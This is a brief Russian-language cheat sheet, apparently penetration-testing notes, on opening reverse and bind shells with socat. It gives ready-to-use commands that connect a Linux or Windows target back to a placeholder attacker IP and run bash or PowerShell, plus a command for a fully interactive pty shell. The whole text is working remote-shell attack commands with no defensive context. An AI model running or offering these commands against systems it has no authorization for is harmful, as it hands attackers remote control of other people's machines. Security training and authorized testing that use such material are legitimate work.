#REVERSE SHELL
1. На атакующей машине прослушиваем порт:
socat TCP-L:<port> -
2. На целевой машине создаем обратное соединение:
windows:
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
linux:
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

#BIND SHELL

1. На целевой машине создаем привязанный шелл:
linux:
socat TCP-L:<PORT> EXEC:"bash -li"
windows:
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

2. На атакующей машине подключаемся к целевой машине:
socat TCP:<TARGET-IP>:<TARGET-PORT> -



# Пример полной стабилизации обратного шелла на Linux с помощью мощной команды:

socat TCP-L:<port> FILE:`tty`,raw,echo=0  # создаем привязанный шелл на атакующей машине

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # создаем обратное соединение на целевой машине
